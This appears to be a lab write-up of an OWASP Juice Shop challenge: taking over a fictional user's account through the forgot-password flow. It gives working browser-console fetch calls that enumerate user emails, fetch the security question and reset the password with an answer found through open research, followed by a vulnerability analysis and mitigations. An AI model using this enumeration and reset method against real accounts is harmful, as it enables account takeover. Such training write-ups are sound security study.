### **Methodology**

1. **Reconnaissance**
   - Identified the challenge as resetting Bender's password via the Forgot Password mechanism using the original answer to his security question.

2. **Account Enumeration**
   - Retrieved Bender's email address from the Users API:
     ```js
     fetch('/api/Users/', {
       headers: { 'Authorization': 'Bearer ' + localStorage.getItem('token') }
     }).then(r => r.json()).then(d => {
       const bender = d.data.find(x => x.email.toLowerCase().includes('bender'))
       console.log(bender.email)
     })
     // Output: bender@juice-sh.op
     ```

3. **Security Question Retrieval**
   - Queried the security question endpoint to retrieve Bender's question:
     ```js
     fetch('/rest/user/security-question?email=bender@juice-sh.op')
       .then(r => r.json()).then(console.log)
     // Output: "Company you first work for as an adult?"
     ```

4. **OSINT — Identifying the Answer**
   - Bender is a fictional character from the animated series **Futurama** (Bender Bending Rodriguez).
   - Research into the show's lore revealed that Bender's first job as an adult was at **Stop'n'Drop**, a suicide booth company, before joining Planet Express.

5. **Password Reset**
   - Submitted the password reset request with the discovered security answer:
     ```js
     fetch('/rest/user/reset-password', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
         email: 'bender@juice-sh.op',
         answer: "Stop'n'Drop",
         new: 'bender123',
         repeat: 'bender123'
       })
     })
     ```

6. **Validation**
   - The password reset succeeded and the challenge was marked as solved.

7. **Tools Used**
   - **Browser DevTools** (console)
   - **OSINT** (Futurama wiki research)
   - **JavaScript `fetch` API** (for sending the reset request)

---
### **Vulnerabilities**

1. **Vulnerability Name**
   - **Weak Security Question / Knowledge-Based Authentication** (CWE-640)

2. **Affected Components**
   - **Forgot Password Mechanism** (`POST /rest/user/reset-password`) and **Security Question System**

3. **Severity Level**
   - **Medium**
     - The security question answer is publicly discoverable via OSINT, allowing any attacker to reset the password without additional authentication factors.
     - The `/api/Users/` endpoint exposes all user email addresses to any authenticated user, enabling trivial account enumeration.

---
### **Risks**

1. **Business Impact**
   - **Account Takeover**: Any user whose security question answer is publicly discoverable is vulnerable to password reset attacks.
   - **Data Breach**: A compromised account exposes the user's personal data, order history, and payment information.
   - **Mass Enumeration**: The exposed Users API allows attackers to enumerate all accounts and systematically target those with weak security questions.
   - **Reputational Damage**: Account takeover via a trivially bypassable recovery mechanism severely damages user trust.

2. **Exploitation Potential**
   - An attacker can enumerate all accounts via the Users API, identify targets with guessable security questions, and reset their passwords at scale.
   - The vulnerability can be chained with social engineering to identify security question answers for real users.

---
### **Actions**

#### **Risk Mitigation Strategies**
- Replace knowledge-based security questions with secure password reset mechanisms such as time-limited email tokens or TOTP/SMS verification.
- If security questions must be used, enforce minimum answer entropy and prohibit answers that are publicly discoverable.
- Restrict the `/api/Users/` endpoint to admin-only access to prevent email enumeration.
- Implement rate limiting on the password reset endpoint to slow brute force attempts.

#### **Remediation Fixes**
- Replace the security question reset flow with a tokenized email reset link that expires after 15-30 minutes.
- If security questions are retained, add a lockout mechanism after 3-5 failed answer attempts.
- Anonymize or remove sensitive fields from the `/api/Users/` response for non-admin users.

#### **Best Security Practices**
- NIST SP 800-63B explicitly recommends against knowledge-based authentication for password recovery due to the ease of OSINT-based attacks.
- Use Multi-Factor Authentication (MFA) as the primary account recovery mechanism.
- Security questions based on fictional characters, public figures, or easily researched facts should never be accepted.
- **Reference**: [OWASP Forgot Password Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html)
